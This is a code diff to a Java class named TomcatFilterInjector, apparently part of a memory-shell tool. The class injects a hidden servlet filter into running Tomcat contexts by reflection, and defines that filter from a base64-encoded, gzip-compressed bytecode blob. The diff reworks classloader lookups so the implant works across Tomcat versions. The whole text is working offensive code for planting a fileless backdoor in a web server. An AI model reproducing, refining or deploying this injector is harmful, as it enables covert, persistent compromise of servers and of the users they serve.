@@ -39,8 +39,8 @@ public class TomcatFilterInjector {
         try {
             List<Object> contexts = getContext();
             for (Object context : contexts) {
-                Object filter = getShell(context);
-                inject(context, filter);
+                getShell(context);
+                inject(context);
             }
         } catch (Exception e) {
             e.printStackTrace();
@@ -66,46 +66,48 @@ public class TomcatFilterInjector {
         return contexts;
     }
 
+    private ClassLoader getWebAppClassLoader(Object context) {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            Object loader = invokeMethod(context, "getLoader", null, null);
+            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
+        ClassLoader webAppClassLoader = getWebAppClassLoader(context);
         try {
-            return classLoader.loadClass(getClassName()).newInstance();
+            return webAppClassLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
             byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
-            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
+            Class<?> clazz = (Class<?>) defineClass.invoke(webAppClassLoader, clazzByte, 0, clazzByte.length);
             return clazz.newInstance();
         }
     }
 
     @SuppressWarnings("all")
-    public void inject(Object context, Object filter) throws Exception {
+    public void inject(Object context) throws Exception {
         if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
             System.out.println("filter already injected");
             return;
         }
         Object filterDef;
         Object filterMap;
+        ClassLoader contextClassLoader = context.getClass().getClassLoader();
         try {
-            // tomcat v8/9
-            filterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef", true, context.getClass().getClassLoader()).newInstance();
-            filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap", true, context.getClass().getClassLoader()).newInstance();
+            // tomcat v8+
+            filterDef = contextClassLoader.loadClass("org.apache.tomcat.util.descriptor.web.FilterDef").newInstance();
+            filterMap = contextClassLoader.loadClass("org.apache.tomcat.util.descriptor.web.FilterMap").newInstance();
         } catch (Exception e2) {
-            // tomcat v6/7
-            try {
-                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
-                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
-            } catch (Exception e) {
-                // tomcat v5
-                filterDef = Class.forName("org.apache.catalina.deploy.FilterDef", true, context.getClass().getClassLoader()).newInstance();
-                filterMap = Class.forName("org.apache.catalina.deploy.FilterMap", true, context.getClass().getClassLoader()).newInstance();
-            }
+            // tomcat v5+
+            filterDef = contextClassLoader.loadClass("org.apache.catalina.deploy.FilterDef").newInstance();
+            filterMap = contextClassLoader.loadClass("org.apache.catalina.deploy.FilterMap").newInstance();
         }
+
         invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{getClassName()});
         invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{getClassName()});
         invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
@@ -114,11 +116,9 @@ public class TomcatFilterInjector {
         Constructor<?>[] constructors;
         try {
             invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
-            constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig", true, context.getClass().getClassLoader()).getDeclaredConstructors();
         } catch (Exception e) {
             // tomcat v5
             invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
-            constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig", true, context.getClass().getClassLoader()).getDeclaredConstructors();
         }
         try {
             // v7.0.0 以上
@@ -126,18 +126,14 @@ public class TomcatFilterInjector {
         } catch (Exception e) {
             invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
         }
-        constructors[0].setAccessible(true);
-        try {
-            Object filterConfig = constructors[0].newInstance(context, filterDef);
-            Map filterConfigs = (Map) getFieldValue(context, "filterConfigs");
-            filterConfigs.put(getClassName(), filterConfig);
-            System.out.println("filter inject success");
-        } catch (Exception e) {
-            // 一个 tomcat 多个应用部分应用通过上下文线程加载 filter 对象，可能在目标应用会加载不到
-            if (!(e.getCause() instanceof ClassNotFoundException)) {
-                throw e;
-            }
-        }
+
+        Constructor filterConfigConstructor;
+        filterConfigConstructor = contextClassLoader.loadClass("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors()[0];
+        filterConfigConstructor.setAccessible(true);
+        Object filterConfig = filterConfigConstructor.newInstance(context, filterDef);
+        Map filterConfigs = (Map) getFieldValue(context, "filterConfigs");
+        filterConfigs.put(getClassName(), filterConfig);
+        System.out.println("filter inject success");
     }
 
     @SuppressWarnings("all")
